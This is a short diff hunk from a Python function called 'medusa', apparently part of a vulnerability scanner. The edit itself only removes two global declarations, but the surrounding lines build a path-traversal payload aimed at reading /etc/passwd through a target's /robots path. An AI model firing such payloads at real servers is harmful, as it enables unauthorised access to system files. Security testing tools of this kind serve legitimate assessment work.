@@ -39,8 +39,6 @@ def medusa(Url,RandomAgent,ProxyIp):
         port = 80
     else:
         port = port
-    global resp
-    global resp2
     try:
         payload = "../../../../../../../../etc/passwd{{"
         payload_url = scheme + "://" + url +":"+ str(port) + "/robots"
